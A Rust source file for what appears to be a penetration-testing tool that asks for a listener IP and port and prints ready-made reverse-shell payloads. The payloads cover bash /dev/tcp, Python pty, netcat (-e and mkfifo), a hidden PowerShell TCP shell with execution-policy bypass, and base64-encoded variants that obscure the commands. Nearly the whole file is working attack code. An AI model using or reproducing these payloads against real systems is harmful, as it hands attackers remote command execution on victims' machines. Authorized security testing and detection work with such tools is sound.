use clap::Parser;
use colored::*;
use if_addrs::get_if_addrs;
use inquire::Select;
use std::process;
use base64::{engine::general_purpose, Engine as _};
use term_size;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    port: u16,

    #[arg(short, long)]
    ip: Option<String>,

    #[arg(long, default_value_t = true)]
    all: bool,
}

fn main() {
    let args = Args::parse();
    let port = args.port;

    // Determine the IP address
    let ip = match args.ip {
        Some(addr) => addr,
        None => select_interface_ip(),
    };

    println!("\n{}: {}:{}\n", "Generating payloads for".green().bold(), ip.cyan(), port.to_string().cyan());

    // Generate and display payloads
    generate_bash(&ip, port);
    generate_python(&ip, port);
    generate_netcat(&ip, port);
    generate_powershell(&ip, port);
}


fn select_interface_ip() -> String {
    let interfaces = get_if_addrs().unwrap_or_else(|e| {
        eprintln!("{} {}", "Error fetching interfaces:".red(), e);
        process::exit(1);
    });

    let mut options = Vec::new();
    for iface in interfaces {
        if iface.addr.ip().is_ipv4() {
            let label = format!("{} ({})", iface.addr.ip(), iface.name);
            options.push(label);
        }
    }

    if options.is_empty() {
        eprintln!("{}", "No valid network interfaces found.".red());
        process::exit(1);
    }

    let ans = Select::new("Select the listening IP address:", options).prompt();

    match ans {
        Ok(choice) => {
            choice.split_whitespace().next().unwrap().to_string()
        }
        Err(_) => {
            eprintln!("{}", "Selection cancelled.".red());
            process::exit(0);
        }
    }
}

// --- Payload Generators ---

fn generate_bash(ip: &str, port: u16) {
    print_section_separator();
    print_header("Bash");
    let payload = format!("bash -i >& /dev/tcp/{}/{} 0>&1", ip, port);
        println!("{}", payload);
        println!();
}

fn generate_python(ip: &str, port: u16) {
    print_section_separator();
    print_header("Python3");
    let payload = format!(
        "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{}\",{}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")'",
        ip, port
    );
    println!("{}", payload);
        println!();

    print_header("Python3 Base64");
    let encoded = general_purpose::STANDARD.encode(payload.as_bytes());
    let base64_payload = format!(
        "echo {} | base64 -d | /bin/bash",
        encoded
    );
    println!("{}", base64_payload);
        println!();
}

fn generate_netcat(ip: &str, port: u16) {
    print_section_separator();
    print_header("Netcat (Traditional)");
        println!("nc -e /bin/sh {} {}", ip, port);
        println!();
    
    print_header("Netcat (OpenBSD/No -e flag)");
        println!("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {} {} >/tmp/f", ip, port);
        println!();
}

fn generate_powershell(ip: &str, port: u16) {
    print_section_separator();
    print_header("PowerShell");
    let payload = format!(
        "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient(\'{}\', {});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()",
        ip, port
    );
    println!("{}", payload);
        println!();

    print_header("PowerShell Base64");
    let ps_before_encoding = format!("$client = New-Object System.Net.Sockets.TCPClient(\"{}\",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()", ip, port);
    let utf16le: Vec<u8> = ps_before_encoding.encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let encoded = general_purpose::STANDARD.encode(&utf16le);
    let base64_payload = format!(
        "powershell -e {}",
        encoded
    );
    println!("{}", base64_payload);
        println!();
}

fn print_header(lang: &str) {
    let colored = match lang {
        "Bash" => lang.green().bold(),
        "Python3" | "Python3 Base64" => lang.blue().bold(),
        "Netcat (Traditional)" | "Netcat (OpenBSD/No -e flag)" => lang.magenta().bold(),
        "PowerShell" | "PowerShell Base64" => lang.red().bold(),
        _ => lang.yellow().bold(),
    };
    println!("[{}]", colored);
}

fn print_section_separator() {
    let width = terminal_width().unwrap_or(60);
    println!("{}\n", "─".repeat(width));
}

fn terminal_width() -> Option<usize> {
    term_size::dimensions().map(|(w, _)| w)
}